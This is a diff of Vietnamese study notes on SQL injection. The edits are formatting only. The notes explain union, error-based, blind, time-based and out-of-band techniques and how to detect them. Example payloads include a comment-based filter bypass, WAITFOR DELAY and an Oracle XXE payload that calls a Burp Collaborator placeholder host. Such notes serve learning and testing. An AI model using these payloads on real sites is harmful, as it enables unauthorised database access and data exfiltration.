@@ -7,11 +7,11 @@
 **User input** không được tách biệt khỏi SQL query, khiến dữ liệu đầu vào có thể được database diễn giải như một phần của câu lệnh SQL.
 
 ## Example 
-* Cho URL `https://insecure-website.com/products?category=Gifts` với query tương ứng `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+* Cho URL `https://insecure-website.com/products?category=Gifts` với query tương ứng `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`.
 
-* Query này hiển thị các sản phẩm thuộc danh mục **Gifts** (điều kiện `category = 'Gifts'`) và sản phẩm đó đang được phát hành (điều kiện `released = 1`). Tuy nhiên nếu sửa URL: `https://insecure-website.com/products?category=Gifts'--` 
+* Query này hiển thị các sản phẩm thuộc danh mục **Gifts** (điều kiện `category = 'Gifts'`) và sản phẩm đó đang được phát hành (điều kiện `released = 1`). Tuy nhiên nếu sửa URL: `https://insecure-website.com/products?category=Gifts'--` .
 
-* Lúc này query bị biến đổi: `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
+* Lúc này query bị biến đổi: `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`.
 
 * Vì `--` sẽ comment toàn bộ đoạn code phía sau nên điều kiện `released = 1` không được áp dụng dẫn đến attacker sẽ truy cập được toàn bộ sản phẩm ngay cả khi chúng không được phát hành.
 
@@ -29,7 +29,7 @@
       ```
   * **Error-based**
     * Type 1: Dựa trên thông báo lỗi của DB để ép hiển thị dữ liệu nhạy cảm ra màn hình.
-      * Example `CAST((SELECT version()) AS int)`
+      * Example `CAST((SELECT version()) AS int)`.
     * Type 2: Dựa trên mã lỗi HTTP 200/500.
       * Example `CASE WHEN (1=1) THEN 1/0 ELSE '' END`.
 * **Blind SQLi:** Web không in trực tiếp dữ liệu ra màn hình, phải suy đoán gián tiếp.
@@ -41,10 +41,7 @@
     * Example: `WAITFOR DELAY '0:0:5'`.
 * **Out-of-band SQLi (OAST)**
   * Mục đích: Ép DB gửi request DNS hoặc HTTP ra server bên ngoài khi không thấy kết quả phản hồi nào từ web.
-  * Example:
-    ```
-    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-    ```
+  * Example: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`.
 
 ## How to detect SQLi
 1. Xác định **entry points** có khả năng truyền dữ liệu vào DB (GET, POST, HTTP Headers, Cookies, API Endpoints).
@@ -54,10 +51,10 @@
    * Ki tự nối chuỗi hoặc ngắt lệnh: `;`,`--`,`#`.
    * Payload tạo **time delays**.
 3. Xác định loại lỗi:
-   * Web trả về mã lỗi 500 hoặc rò rỉ thông báo lỗi cú pháp -> Error-based.
-   * `id=1'`/`id=1''` hoặc `AND 1=1`/`AND 1=2` làm (mất/hiện) dữ liệu -> Union-based hoặc Boolean-based.
-   * Giao diện không đổi + payload thời gian hoạt động -> Time-based.
-   * Các cách trên thất bại -> OAST.
+   * Web trả về mã lỗi 500 hoặc rò rỉ thông báo lỗi cú pháp -> **Error-based**.
+   * `id=1'`/`id=1''` hoặc `AND 1=1`/`AND 1=2` làm (mất/hiện) dữ liệu -> **Union-based** hoặc **Boolean-based**.
+   * Giao diện không đổi + payload thời gian hoạt động -> **Time-based**.
+   * Các cách trên thất bại -> **OAST**.
 
 ## DBSM
 Syntax SQL có thể khác nhau giữa các DBMS, vì vậy cần tham khảo cheat sheet phù hợp với DBMS đang được sử dụng.
